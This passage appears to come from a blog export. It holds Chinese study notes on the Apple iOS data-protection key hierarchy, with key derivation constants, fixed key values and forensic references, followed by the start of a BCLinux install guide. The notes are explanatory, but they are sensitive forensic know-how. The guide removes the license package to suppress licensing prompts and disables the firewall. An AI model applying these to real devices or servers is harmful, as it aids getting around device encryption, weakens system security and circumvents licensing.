href=\"#1-EMF-key-LwVM-VEK\" class=\"headerlink\" title=\"1. EMF key &#x3D; LwVM &#x3D; VEK\"></a>1. EMF key &#x3D; LwVM &#x3D; VEK</h3><p>在首次系统安装时创建的原生随机数 <code>FileSystem Key</code>，以 <code>key 0x89B</code> 包裹形成密文 <code>EMF Key</code>，并持久化存储在 NAND 的可擦除分区。<br>EMF Key 负责数据分区（Data Partition）的加密，也称为卷宗加密密钥 VEK（Volume Encryptition Key）<br>在iOS 5之后也被称为 <code>LwVM</code>（Lightweight Volume Manager）</p>\n<ul>\n<li>功能描述：<strong>数据分区</strong>（data partition）的加密密钥，</li>\n<li>构造方式：原生随机数，<strong>在首次安装操作系统或被用户擦除设备时创建（ToDO：？）</strong></li>\n<li>构造方式：<code>EMF Key = AES(FileSystem Key, key 0x89B)</code></li>\n<li>储存位置：NAND闪存的可擦除区域</li>\n</ul>\n<blockquote>\n<p>EMF key used for filesystem key is derived from key 0x89B - can be read by reading the LWVM locker(0x4C77564d) in EffaceableStorage - see iphone data protection project for how get this.</p>\n</blockquote>\n<h3 id=\"2-Dkey\"><a href=\"#2-Dkey\" class=\"headerlink\" title=\"2. Dkey\"></a>2. Dkey</h3><p>设备密钥，Device key</p>\n<ul>\n<li>功能描述：就是<code>NSProtectionNone</code> 类密钥的封装密钥，主要用于远程数据擦除</li>\n<li>构造方式：原生随机数</li>\n<li>加密方式：decrypt(Dkey, key 0x835)</li>\n<li>储存位置：NAND闪存的可擦除区域</li>\n</ul>\n<blockquote>\n<p>闪存Flash的特点是wear-leveling，删除数据很困难，但加密了就容易多了，直接删除密钥就OK</p>\n</blockquote>\n<h3 id=\"3-BAG1-system-bag\"><a href=\"#3-BAG1-system-bag\" class=\"headerlink\" title=\"3. BAG1: system bag\"></a>3. BAG1: system bag</h3><ul>\n<li>功能描述：系统密钥包（<code>/private/var/keybags/systembag.kb</code>）的文件级密钥，并包含一个初始向量IV</li>\n<li>构造方式：原生随机数</li>\n<li>加密方式：<strong>不加密</strong>。系统密钥包实际是一个数据文件，保存的Class Key还有一层加密</li>\n<li>储存位置：NAND闪存的可擦除区域</li>\n</ul>\n<p>系统密钥包有效负载密钥 （+初始化向量）。未加密地存储在可擦除区域。</p>\n<h3 id=\"4-NAND-Key\"><a href=\"#4-NAND-Key\" class=\"headerlink\" title=\"4. NAND Key\"></a>4. NAND Key</h3><p>负责加密GPT分区表和系统分区表，也被称为媒体密钥（media key）</p>\n<h2 id=\"三、系统密钥包（System-Bag）的工作原理是什么？\"><a href=\"#三、系统密钥包（System-Bag）的工作原理是什么？\" class=\"headerlink\" title=\"三、系统密钥包（System Bag）的工作原理是什么？\"></a>三、系统密钥包（System Bag）的工作原理是什么？</h2><ul>\n<li>文件内容被加密，每个文件都有独立的文件密钥<code>Per-file Key</code></li>\n<li><code>Per-file Key</code>被<code>Class Key</code>加密，存储位置：该文件的元数据 Meatadata 的<code>cprotect</code>字段</li>\n</ul>\n<p>File is encrypted with a File Key<br>File Key encrypted with Class Key<br>Class Key encrypted with Passcode Key Passcode key derived from:<br>    • •<br>UID, 0x835, Passcode<br>Keybag encrypted with Bag Key Entire disk encrypted with EMF Key<br>EMF key encrypted using 0x89b<br>0x89b and 0x835 derived from UID</p>\n<hr>\n<p>salads</p>\n<ul>\n<li><code>BAG1</code>: System Keybag payload key and IV</li>\n<li><code>Dkey</code>: NSProtectionNone class master key</li>\n<li><code>EMF!</code>: Filesystem encryption key</li>\n</ul>\n<h3 id=\"ios-4\"><a href=\"#ios-4\" class=\"headerlink\" title=\"ios 4\"></a>ios 4</h3><ul>\n<li>Only User partition is encrypted</li>\n<li>Available protection classes:<ul>\n<li>NSProtectionNone</li>\n<li>NSProtectionComplete</li>\n</ul>\n</li>\n<li>When no protection class set, EMF key is used – Filesystem metadata and unprotected files<ul>\n<li>Transparent encryption and decryption (same as pre-iOS 4)</li>\n</ul>\n</li>\n<li>When protection class is set, per-file random key is used<ul>\n<li>File key protected with master key is stored in extended attribute com.apple.system.cprotect</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"ios-Storage\"><a href=\"#ios-Storage\" class=\"headerlink\" title=\"ios Storage\"></a>ios Storage</h3><p>• New partition scheme<br>– “LwVM” – Lightweight Volume Manager<br>• Any partition can be encrypted • New protection classes<br>– NSFileProtectionCompleteUntilFirstUserAuthentication – NSFileProtectionCompleteUnlessOpen<br>• IV for file encryption is computed differently</p>\n<h3 id=\"2-EMF-key\"><a href=\"#2-EMF-key\" class=\"headerlink\" title=\"2. EMF key\"></a>2. EMF key</h3><p>密钥：数据分区加密密钥。也称为“媒体密钥”。通过密钥0x89B加密存储</p>\n<h3 id=\"Passcode-Key\"><a href=\"#Passcode-Key\" class=\"headerlink\" title=\"Passcode Key\"></a>Passcode Key</h3><p>Passcode Key是用戶輸入的passcode結合系統硬件的加密引擎以及PBKDF2(Password-Based Key Derivation Function)算法生成的。PBKDF2的基本原理是通過一個偽隨機函數，把明文和一個鹽值及加密重複次數作為輸入參數，然後重複進行運算，並最終產生密鑰。重複運算的會使得暴力破解的成本變得很高，而硬件key及鹽值的添加基本上斷絕了通過“彩虹表”攻擊的可能。</p>\n<p>由於硬件加密引擎的Key無法提取，所以只能在目標的機器上運行暴力破解程序進行破解，假設用戶的密碼設置的足夠複雜的話，那麼破解的周期就會變得非常久。</p>\n<p>KDF &#x3D; Deriving Key from Password</p>\n<p>密码密钥：使用 Apple 自定义派生函数 (Tangling) 从用户密码或托管密钥包 BagKey 计算得出。用于从系统&#x2F;托管密钥包中解开类密钥。解开钥匙包钥匙后立即从内存中删除。</p>\n<p>在支持数据保护的 Apple 设备上， 密钥加密密钥 (KEK) 既受系统上软件测量值的保护 （或密封）， 又与只能从安全隔区获得的 UID 绑定。 在搭载 Apple 芯片的 Mac 上， 对 KEK 的保护通过整合有关系统安全性策略的信息进一步得到了加强， 因为 macOS 支持其他平台不支持的关键安全性策略更改 （例如， 停用安全启动或 SIP）。 在搭载 Apple 芯片的 Mac 上， 由于文件保险箱的实施使用数据保护 （C 类）， 此保护涵盖文件保险箱密钥。<br>On Apple devices that support Data Protection, the key encryption key (KEK) is protected (or sealed) with measurements of the software on the system, as well as being tied to the UID available only from the Secure Enclave.</p>\n<p>xART An abbreviation for eXtended Anti-Replay Technology.</p>\n<p><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/SKP.png\" alt=\"SKP\"><br><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/SKP-C.png\" alt=\"SKP\"></p>\n<p>SKP &#x3D; 密封密钥保护，也称为操作系统绑定密钥<br>KEK &#x3D; key encryption key，密钥加密密钥<br>VEK &#x3D; volume encryption key，卷宗加密密钥<br>xART key &#x3D; eXtended Anti-Replay Technology key，扩展反重放技术的密钥，就是第二代安全存储组件的<strong>唯一加密密钥</strong></p>\n<p>SMRK &#x3D; the crypto-hardware-derived System Measurement Root Key (SMRK)，系统测量根密钥，从加密硬件派生<br>SMDK &#x3D; the system measurement device key，系统测量设备密钥，</p>\n<p>PDK &#x3D; Passcode-derived key，用户密码派生密钥<br>？ Key Wrapping Key, 密钥封装密钥。<br>  随机宗卷密钥由密钥封装密钥加密和封装。<br>  密钥封装密钥由安全隔区长期储存， 只在安全隔区中可见。 每次用户抹掉设备时， 它都会发生变化。</p>\n<blockquote>\n<p>在 Apple A10 及后续型号的 SoC 上， PKA 支持操作系统绑定密钥， 也称为密封密钥保护 (SKP)。<br>这些密钥基于设备 UID 和设备上所运行 sepOS 的哈希值组合生成。<br>哈希值由安全隔区 Boot ROM 提供， 在Apple A13 及后续型号的 SoC 上， 则由安全隔区启动监视器提供。<br>这些密钥还用于在请求特定 Apple 服务时验证 sepOS 版本， 以及用于在系统发生重大更改而未获得用户授权时通过协助阻止访问密钥材料来提高受密码保护数据的安全性。</p>\n</blockquote>\n<p>关键0x835：由内核在引导时计算。仅用于 iOS 3 及更低版本中的钥匙串加密。用作“设备密钥”，用于保护 iOS 4 中的类密钥。</p>\n<p>key835 &#x3D; AES(UID, bytes(“01010101010101010101010101010101”))<br>关键0x89B：由内核在引导时计算。用于加密存储在闪存上的数据分区键。防止直接从 NAND 芯片读取数据分区键。</p>\n<p>key89B &#x3D; AES(UID, bytes(“183e99676bb03c546fa468f51c0cbd49”))</p>\n<p>DKey： NSProtectionNone class key.用于包装 iOS 4 中数据分区上“始终可访问”文件的文件名。由密钥0x835包装存储</p>\n<p>BAG1 密钥：系统密钥包有效负载密钥 （+初始化向量）。未加密地存储在可擦除区域。</p>\n<p>密码密钥：使用 Apple 自定义派生函数 （Tangling） 从用户密码或托管密钥包 BagKey 计算得出。用于从系统&#x2F;托管密钥包中解开类密钥。钥匙包钥匙解开包装后立即从内存中删除。</p>\n<p>文件系统密钥（f65dae950e906c42b254cc58fc78eece）：用于加密分区表和系统分区（图中称为“NAND 密钥”）</p>\n<p>元数据密钥（92a742ab08c969bf006c9412d3cc79a5）：加密NAND元数据（vfl &#x2F; ftl上下文和索引页面）</p>\n<hr>\n<p>The keys used to access file data are stored on disk in a wrapped state. You access these keys through a chain of key-unwrapping operations. The volume encryption key (VEK) is the default key used to access encrypted content on the volume. <strong>The key encryption key (KEK) is used to unwrap the VEK</strong>. The KEK is unwrapped in one of several ways:</p>\n<ul>\n<li>User password. The user enters their password, which is used to unwrap the KEK.</li>\n<li>Personal recovery key. This key is generated when the drive is formatted and is saved by the user on a paper printout. The string on that printout is used to unwrap the KEK.</li>\n<li>Institutional recovery key. This key is enabled by the user in Settings and allows the corresponding corporate master key to unwrap the KEK.</li>\n<li>iCloud recovery key. This key is used by customers working with Apple Support, and isnʼt described in thisdocument.</li>\n</ul>\n<p>For example, to access a file given the userʼs password on a volume that uses per-volume encryption, the chain of key unwrapping and data decryption consists of the following high-level operations:</p>\n<ol>\n<li>Unwrap the KEK using the userʼs password.</li>\n<li>Unwrap the VEK using the KEK.</li>\n<li>Decrypt the file-system B-tree using the VEK.</li>\n<li>Decrypt the file data using the VEK.</li>\n</ol>\n<p>The detailed steps are described in Accessing Encrypted Objects below.</p>\n<blockquote>\n<p>KEK - 密钥加密密钥，似乎就是 Passcode Key；VEK - 卷宗加密密钥，似乎就是 EMF Key</p>\n</blockquote>\n<hr>\n<h3 id=\"FileSystem-Key：文件系统密钥\"><a href=\"#FileSystem-Key：文件系统密钥\" class=\"headerlink\" title=\"FileSystem Key：文件系统密钥\"></a>FileSystem Key：文件系统密钥</h3><ul>\n<li>用于加密 <code>GPT</code>分区表 和 系统分区表<code>System Partition</code></li>\n<li>也被称为 <code>NAND Key</code></li>\n</ul>\n<blockquote>\n<p>file system key The key that encrypts each file’s metadata, including its class key. This is kept in Effaceable Storage to facilitate fast wipe, rather than confidentiality.</p>\n</blockquote>\n<p>系统会使用文件系统密钥(the file system key)解密文件的元数据， 以显露出封装的文件独有密钥和表示它受哪个类保护的记号<br>用于加密每个文件的元数据的密钥， 包括其类密钥。 存储在可擦除存储器中， 用于实现快速擦除， 并非用于保密目的。<br>加密的文件系统密钥还会使用储存在可擦除存储器中的“可擦除密钥”( an “effaceable key”) 封装，或者使用受安全隔区反重放机制保护的媒介密钥封装密钥（a media key-wrapping key）进行封装。</p>\n<blockquote>\n<p>the Secure Storage Component’s unique cryptographic key<br>此密钥不会提供数据的额外机密性。 相反，它可以根据需要快速抹掉。</p>\n</blockquote>\n<blockquote>\n<p>数据宗卷文件系统中所有文件的元数据都使用随机宗卷密钥(a random volume key)进行加密， 该密钥在首次安装操作系统或用户擦除设备时创建。<br>此密钥由密钥封装密钥(a key wrapping key)加密和封装， 密钥封装密钥由安全隔区长期储存， 只在安全隔区中可见。 每次用户抹掉设备时， 它都会发生变化。<br>在 A9 （及后续型号） SoC 上， 安全隔区依靠由反重放系统支持的熵来实现可擦除性， 以及保护其他资源中的密钥封装密钥。 有关更多信息， 请参阅安全非易失性存储器。</p>\n</blockquote>\n<p>文件系统密钥用于保护GPT分区表（GUID Partition Table）和系统分区（System partition）。<br>Todo： 也被称为 NAND 密钥？<br>文件系统密钥（f65dae950e906c42b254cc58fc78eece）</p>\n<h3 id=\"Metadata-Key：元数据密钥\"><a href=\"#Metadata-Key：元数据密钥\" class=\"headerlink\" title=\"Metadata Key：元数据密钥\"></a>Metadata Key：元数据密钥</h3><p>元数据密钥(92a742ab08c969bf006c9412d3cc79a5)：加密 NAND 元数据（vfl&#x2F;ftl 上下文和索引页）<br><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/FileVault.png\" alt=\"文件保险箱\"></p>\n<p>以 UID 为基础衍生出多个密钥，其中：</p>\n<ul>\n<li><code>key 0x89B</code>:</li>\n<li>，會衍生出多隻金鑰，其中兩隻金鑰、0x89B與0x835會用於Device Keybag上。0x89B功能同FDE，會透過EMF金鑰針對整個File System&#x2F;Partition進行加密保護。而Passcode則是用戶自己產生，從iOS 9之後，預設的Passcode長度為6個數字，而0x835 Key與Passcode Key(從Passcode透過加密運算產生)會針對所有的Class Key進行加密(除了Class 4 Key外)。</li>\n</ul>\n<p>data partition 每个文件创建时，Data Protection会创建一个256-bit key (“per-file” key) ，然后使用这个密钥借助硬件 AES engine。加密模式通常是AES CBC mode（不懂的看密码学）. 既然是CBC自然需要IV，IV怎么来， 用文件的块偏移计算LFSR（ linear feedback shift register (LFSR) calculated with the block offset into the file）, IIV也是加密存储，encrypted with the SHA-1 hash of the per-file key.</p>\n<p>per-file key是实际用来加密文件的，那它也得被保护啊。这就得分好几种条件了。<br>然后，加密的 per-file key is stored in the file’s metadata。.</p>\n<p>然后file’s metadata又被加密了，The metadata of all files in the file system are encrypted with a random key, which is created when iOS is first installed or when the device is wiped by a user. The file system key is stored in Effaceable Storage. 其实这个加密价值不大。主要是为了销毁密钥方便。ios界面上操作 “Erase all content and settings” option,就是干掉了这个密钥。最终无法获得加密的per-file key。per-file key到底被谁加密，环境很多。根据不同的环境使用不用的 class key。 class key 又被 hardware UID 保护，有些情况下是通过user’s passcode. 如果你的数据相关联pin，那就得靠他。这非常重要！！！</p>\n<p>多层密钥架构还有一个好处，就是对加密的内容更换密钥，无需重新加解密数据，那样效率很低，而只需更换加密key。</p>\n<p>有密碼保護與無密碼保護的iTunes備份最大的差異是在Keybag是否被UID Key加密的狀態下儲存於iTunes備份擋內。若iTunes備份檔沒有密碼保護，Keybag會被UID的金鑰加密後儲存於備份檔內(Keychain也是)，這代表這個備份檔案是無法恢復到其他的iOS裝置，僅能恢復到原有備份出來的裝置(因為每個iOS的UID皆不同)。若iTunes備份檔有密碼保護，則Keybag會用iTunes設定的密碼採PBKDF2加密函式反覆運算1千萬次來保護 Keybag ，因Keybag未與UID綁定，當升級新的iOS裝置時就必須採用密碼保護的iTunes備份檔才可進行資料移轉。</p>\n<p>有一个特定的储物柜叫做BAGI，它包含一个加密密钥，用来加密所谓的系统密钥包。密钥包包含许多加密“类密钥”，最终保护文件系统中的文件;它们在不同的时间被锁定和解锁，这取决于用户的活动。这让开发人员可以选择在设备被锁定时是否锁定文件，或者在输入密码后保持解锁，等等。文件系统上的每个文件都有自己的随机文件密钥，该密钥使用密钥包中的类密钥进行加密。密钥包的密钥是由BAGI储物柜中的密钥和用户的PIN的组合加密的。</p>\n<p><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/arch1.png\" alt=\"基本结构\"><br><img src=\"/2022/10/08/Apple%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/arch0.jpeg\" alt=\"简化架构\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">HEADER</span></span><br><span class=\"line\">  <span class=\"variable constant_\">VERS</span> = <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"variable constant_\">TYPE</span> = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"variable constant_\">UUID</span> = <span class=\"number\">32</span> <span class=\"variable constant_\">HEX</span></span><br><span class=\"line\">  <span class=\"variable constant_\">HMCK</span> = <span class=\"number\">80</span> <span class=\"variable constant_\">HEX</span></span><br><span class=\"line\">  <span class=\"variable constant_\">WRAP</span> = <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"variable constant_\">SALT</span> = <span class=\"number\">40</span> <span class=\"title class_\">Hex</span></span><br><span class=\"line\">  <span class=\"variable constant_\">ITER</span> = <span class=\"number\">50000</span></span><br><span class=\"line\">  <span class=\"variable constant_\">TKMT</span> = <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"variable constant_\">SART</span> = <span class=\"number\">98</span></span><br><span class=\"line\">  <span class=\"variable constant_\">UUID</span> = <span class=\"number\">32</span> <span class=\"variable constant_\">HEX</span></span><br><span class=\"line\"><span class=\"variable constant_\">KEYS</span></span><br><span class=\"line\">  <span class=\"number\">0</span>:</span><br><span class=\"line\">    <span class=\"variable constant_\">CLAS</span> = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"variable constant_\">WRAP</span> = <span class=\"number\">3</span></span><br><span class=\"line\">    <span class=\"variable constant_\">KTYP</span> = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"variable constant_\">WPKY</span> = <span class=\"number\">80</span> <span class=\"variable constant_\">HEX</span></span><br><span class=\"line\">    <span class=\"variable constant_\">UUID</span> = <span class=\"number\">32</span> <span class=\"variable constant_\">HEX</span></span><br><span class=\"line\"></span><br><span class=\"line\">... up to</span><br><span class=\"line\">  <span class=\"number\">9</span>:</span><br></pre></td></tr></table></figure>\n\n<p>Hierarchical File System,分层文件系统</p>\n<hr>\n<p>[<a href=\"https://www.adeleda.com/ios-forensics-en.html]\">https://www.adeleda.com/ios-forensics-en.html]</a></p>\n<p>从iPhone 3GS开始，iDevices包含一个加密芯片，可以对文件系统进行硬件加密。 NAND芯片是按如下方式组织的闪存：</p>\n<ul>\n<li>块 0：包含 LLB</li>\n<li>块 1：包含以下加密密钥：<ul>\n<li>EMF：用于加密文件系统</li>\n<li>Dkey：用于加密保护类“NSFileProtectionNone”的主密钥（大多数文件）</li>\n<li>BAG1：与密码一起使用，为其他主密钥生成加密密钥（对于邮件等文件…</li>\n</ul>\n</li>\n<li>块 16 到 （END-15） 块：包含 HFS+ 文件系统</li>\n<li>最后 15 个区块：保留给 Apple 用于其他用途。</li>\n</ul>\n<hr>\n<p>Effaceable lockers<br>EMF!<br>• Data partition encryption key, encrypted with key 0x89B<br>• Format: length (0x20) + AES(key89B, emfkey)<br>Dkey<br>• NSProtectionNone class key, wrapped with key 0x835<br>• Format: AESWRAP(key835, Dkey)<br>BAG1<br>• System keybag payload key<br>• Format : magic (BAG1) + IV + Key<br>• Read from userland by keybagd to decrypt systembag.kb<br>• Erased at each passcode change to prevent attacks on previous keybag</p>\n<hr>\n<p>Data Wipe<br>Operation<br>• mobile_obliterator daemon<br>• Erase DKey by calling MKBDeviceObliterateClassDKey<br>• Erase EMF key by calling selector 0x14C39 in EffacingMediaFilter service<br>• Reformat data partition<br>• Generate new system keybag<br>• High level of confidence that erased data cannot be recovered</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"精品资料\"><a href=\"#精品资料\" class=\"headerlink\" title=\"精品资料\"></a>精品资料</h3><ul>\n<li><a href=\"https://cryptobook.nakov.com/mac-and-key-derivation/kdf-deriving-key-from-password\">面向开发人员的实用密码学 - Svetlin Nako</a></li>\n<li><a href=\"https://github.com/nabla-c0d3/iphone-dataprotection\">iPhone 4 取证工具包 - Github</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"2016-BSidesROC-iOSCrypto.pdf\">iOS加密技术高级分析</a></li>\n<li><a href=\"iOS_Encryption_Systems.pdf\">iOS Encryption Systems - 奥地利格拉茨技术大学论文</a></li>\n<li><a href=\"0721C6_Andrey.Belenko_Evolution.of.iOS.Data.Protection.pdf\">iOS 5的数据保护技术分析</a></li>\n<li><a href=\"iPhone_Data_Protection_in_Depth.pdf\">iPhone 数据保护技术分析 - Sogeti</a></li>\n<li><a href=\"OWASP_BeNeLux_Day_2011_-_A._Belenko_-_Overcoming_iOS_Data_Protection.pdf\">iPhone 数据保护技术 - ELComSoft</a></li>\n<li><a href=\"iOS_backdoor.pdf\">iOS后门分析</a></li>\n</ul>\n<h3 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h3><ul>\n<li><a href=\"https://bbs.pediy.com/thread-174935.htm\">ios安全团队对ios安全的认识</a></li>\n<li><a href=\"https://www.kaotenforensic.com/ios/ios-data-protection/\">iOS资料保护机制简介</a></li>\n<li><a href=\"https://toutiao.io/posts/324007/app_preview\">苹果的锁屏密码到底有多难破？ - 头条</a></li>\n<li><a href=\"https://www.osslab.com.tw/iphone-5c-nand/\">超越FBI NSA, iPhone 5c 以物理NAND備份法破解iOS密碼</a></li>\n<li><a href=\"https://www.theiphonewiki.com/wiki/File_System_Crypto\">Jonathan Zdziarski 对iOS文件系统的论述</a></li>\n<li><a href=\"https://www.leiphone.com/category/zhuanlan/4dO3QQ178rkZ3mo5.html\">FBI vs Apple：FBI是幸运的 - 盘古团队</a></li>\n<li><a href=\"https://paper.seebug.org/papers/Archive/drops2/%E3%80%8AiOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%9A%E6%97%A0%E6%B3%95%E9%94%80%E6%AF%81%E7%9A%84%E6%96%87%E4%BB%B6.html\">iOS 破解分析 - 乌云</a></li>\n<li><a href=\"https://heyonly.github.io/2017/07/02/iOS-%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E4%BF%9D%E6%8A%A4/\">OS 安全攻防之敏感数据保护</a></li>\n<li><a href=\"iOS_backdoor.pdf\">iOS backdoor</a></li>\n<li><a href=\"https://source.android.com/docs/security/features/encryption/file-based?hl=zh-cn\">FBE 文件级加密原理 - Android官方</a></li>\n<li><a href=\"https://page.om.qq.com/page/O3yauEIx2l-9WrUkHgQgRUBw0\">你的安卓手机究竟是FDE加密还是FBE加密？</a></li>\n<li><a href=\"https://www.kaotenforensic.com/android/android_encryption/\">Android 檔案系統加密機制</a></li>\n<li><a href=\"https://www.kaotenforensic.com/android/booting-partitions/\">Android 系統基本架構 - 開機流程與分區說明</a></li>\n<li><a href=\"https://www.pmbonneau.com/multiboot/dataprotection_basics.php\">iOS 数据保护基础知识</a></li>\n<li><a href=\"http://securityhorror.blogspot.com/2013/09/the-hackers-guide-to-dismantling-iphone_5697.html\">拆解 iPhone 的黑客指南（第 3 部分</a></li>\n</ul>\n"},{"title":"BCLinux oe21.10 安装记录","url":"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>移动云的软件源站点是：<a href=\"https://mirrors.cmecloud.cn/\">https://mirrors.cmecloud.cn</a>，提供了一些基础的软件，包括BCLinux。<br>BCLinux的镜像地址为：<a href=\"https://mirrors.cmecloud.cn/bclinux/\">https://mirrors.cmecloud.cn/bclinux/</a></p>\n<blockquote>\n<p><code>mirrors.bclinux.org</code>是同源域名，yum repolist 内部是这个域名</p>\n</blockquote>\n<h3 id=\"1-版本规划\"><a href=\"#1-版本规划\" class=\"headerlink\" title=\"1. 版本规划\"></a>1. 版本规划</h3><p>作为Linux的发行版，BCLinux 有两个完全不同的技术路线，早期的版本是基于 Centos 定制化，包括：</p>\n<ul>\n<li>V7: 基于 Centos 7，目前包含 v7.8，仅提供x86架构</li>\n<li>V8: 基于 Centos 8，目前包含 v8.2、v8.2、v8.6，仅提供 x86 架构</li>\n</ul>\n<p>随着 Centos 停服日期的迫近，以及自主可控操作系统的要求，BCLinux 转向了 OpenEuler，包括：</p>\n<ul>\n<li>oe1: 基于 OpenEuler 20.12，仅提供ARM64架构</li>\n<li>oe21.10: 基于 OpenEuler 21.10 和 21.10U3，提供 x86 和 ARM64 架构</li>\n<li>oe22.10: 基于 OpenEuler 22.10 和 22.10U1，提供 x86 和 ARM64 架构</li>\n</ul>\n<p>目前 BCLinux 的版本生命周期的规划如下：<br><img src=\"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/LTS.png\" alt=\"版本计划\"></p>\n<h3 id=\"2-与-open-Euler-的关系\"><a href=\"#2-与-open-Euler-的关系\" class=\"headerlink\" title=\"2. 与 open Euler 的关系\"></a>2. 与 open Euler 的关系</h3><p>尽管目前的 BCLinux 是基于 <a href=\"https://www.openeuler.org/zh/\">openEuler</a> 的定制化版本，但也存在明显的差异。<br><img src=\"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/openEuler.png\" alt=\"openEuler\"></p>\n<ul>\n<li>BCLinux oe22.10 和 oe22.10 都是基于 OpenEuler 的非公开发行版本</li>\n<li>BCLinux 仅提供 x86_64 和 AArch64 架构，但 openEuler 还提供了 ARM32、RISC-V、LoongArch64、Power 和 SW64 架构。</li>\n</ul>\n<h2 id=\"二、安装方法\"><a href=\"#二、安装方法\" class=\"headerlink\" title=\"二、安装方法\"></a>二、安装方法</h2><p>本次测试的基准版本是 BCLinux oe21.10 的 x86-64 架构。</p>\n<h3 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1. 准备工作\"></a>1. 准备工作</h3><ol>\n<li>通过官方站点<a href=\"https://mirrors.cmecloud.cn/bclinux/oe21.10/ISO/x86_64/release/\">https://mirrors.cmecloud.cn/bclinux/oe21.10/ISO/x86_64&#x2F;release&#x2F;</a>下载ISO安装盘，有基础版本和全量版本，以及两个后续的补丁版本。</li>\n<li>新建一个虚拟机，挂载ISO安装盘，建议内存至少 1GB，硬盘至少 10GB。<br>启动后，根据安装向导提示信息，选择中国上海时区，设置root密码（8位以上，至少3种类型字符）、硬盘分区默认即可，最小化安装方式。</li>\n<li>安装完成后启动虚拟机，如果 console 成功登录即为正常。</li>\n</ol>\n<h3 id=\"2-环境设置\"><a href=\"#2-环境设置\" class=\"headerlink\" title=\"2. 环境设置\"></a>2. 环境设置</h3><ol>\n<li><p>虚拟机添加一个 cloudinit 类型的 CDROM 设备，用于后续管理个性化配置数据。<br>此时，可以顺便卸载ISO安装盘的 CDROM 设备。</p>\n</li>\n<li><p>卸载BCLinux的软件许可，否则执行 YUM 等命令时提示要求购买License。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rpm -evh `rpm -qa |grep bclinux-license`</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>默认安装后网卡尚未启用，需要手动调整。<br>在<code>/etc/sysconfig/network-scripts/</code>目录中找到网卡配置文件<code>ifcfg-ens18</code>（注意不是常见的<code>eth0</code>），删除<code>UUID</code>，并设置<code>ONBOOT=yes</code>。</p>\n</li>\n<li><p>reboot重启虚拟机，此时通过<code>ip a</code>可以发现IP地址已启用，联网成功。</p>\n<blockquote>\n<p>建议此时将虚拟机转换为模版，再 clone 一个虚拟机用于后续安装，以避免误操作又来一次冗长的安装过程。</p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"3-基线版本配置\"><a href=\"#3-基线版本配置\" class=\"headerlink\" title=\"3. 基线版本配置\"></a>3. 基线版本配置</h3><ol>\n<li><p>系统软件安装</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭Firewalld</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装虚拟化软件</span></span><br><span class=\"line\">yum install -y acpid cloud-init cloud-utils-growpart qemu-guest-agent</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> acpid</span><br><span class=\"line\">systemctl start qemu-guest-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 禁用zeroconf(零配置网络服务规范)，该协议目的是在系统无法连接DHCP服务的时候，尝试获取类似169.254.0.0的保留IP</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;NOZEROCONF=yes&quot;</span> &gt;&gt; /etc/sysconfig/network</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 防止ssh连接使用dns导致访问过慢</span></span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/UseDNS/&#123;s@#@@;s@\\s+.+@ no@&#125;&#x27;</span> /etc/ssh/sshd_config</span><br><span class=\"line\">systemctl restart sshd</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>系统安装已默认关闭 selinux， 但仍然启用 firewalld 系统服务</li>\n<li>系统安装默认使用 NetworkManager，因为 networkd.service 已被默认移除</li>\n<li>cloud-init 是核心的虚拟机管理软件，acpid 用于控制虚拟机的电源设备以便宿主机执行关机命令，cloud-utils-growpart 